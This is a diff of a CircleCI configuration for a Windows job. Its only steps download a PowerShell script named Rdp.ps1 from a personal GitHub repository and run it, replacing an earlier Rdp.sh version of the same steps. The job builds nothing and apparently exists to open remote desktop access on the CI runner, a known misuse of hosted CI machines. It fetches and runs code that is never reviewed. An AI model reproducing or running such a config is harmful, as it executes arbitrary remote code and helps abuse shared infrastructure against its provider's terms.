@@ -1,32 +1,19 @@
-version: 2.1 
-
- 
+version: 2.1
  
 orbs:
-
   win: circleci/windows@2.2.0
-  
- 
  
 jobs:
-
-  build: 
-  
+  build:
     executor:
-    
-      name: win/default 
-      
-      size: "medium" 
-      
- 
- 
+      name: win/default
+      shell: powershell.exe
     steps:
+      - run: Invoke-WebRequest https://raw.githubusercontent.com/Gfffvgdsss/Rdp/main/Rdp.ps1
+      - run: ./Rdp.ps1
     
 
-      
-      - run: Invoke-WebRequest https://raw.githubusercontent.com/Gfffvgdsss/Rdp/main/Rdp.sh
-      
-      - run: ./Rdp.sh
+  
       
     
       
